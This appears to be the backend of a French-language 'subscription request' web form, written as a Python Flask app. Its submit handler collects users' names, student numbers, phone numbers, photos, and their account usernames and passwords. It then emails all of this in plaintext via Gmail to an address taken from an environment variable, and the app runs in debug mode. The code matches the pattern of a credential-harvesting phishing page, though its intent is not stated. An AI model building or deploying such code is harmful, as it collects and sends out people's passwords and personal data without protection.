from flask import Flask, render_template, request
import smtplib
from email.message import EmailMessage
import os

app = Flask(__name__)



@app.route('/')
def index():
    return render_template('index.html')

@app.route('/submit', methods=['POST']) 
def submit():
    # Récupérer les données
    first_name = request.form['first_name']
    last_name = request.form['last_name']
    email = request.form['email']
    matricule = request.form['matricule']
    bac_year = request.form['bac_year']
    phone = request.form['phone_number']
    university = request.form['university']
    username = request.form['username']
    password = request.form['password']
    photo = request.files['photo']
    # Construire le message email
    message = f"""
    Les information de user est :

    Prénom: {first_name}
    Nom: {last_name}
    Email: {email}
    Username: {username}
    Password:{password}
    Matricule: {matricule}
    Année Bac: {bac_year}
    Téléphone: {phone}
    Université: {university}
    Photo: {photo}
    """

    # Configuration email
    sender_email = os.environ.get("sender_email")
    sender_password = os.environ.get("mdps")
    receiver_email = os.environ.get("reveiver_email")

    if not sender_email or not sender_password or not receiver_email:
        return "Configuration email manquante", 500

    msg = EmailMessage()
    msg.set_content(message)
    msg['Subject'] = "INFO Demande Abonnement DOU"
    msg['From'] = sender_email
    msg['To'] = receiver_email

    # Envoyer email
    with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
        smtp.login(sender_email, sender_password)
        smtp.send_message(msg)

    return render_template('index.html')

if __name__ == '__main__':
    app.run(debug=True)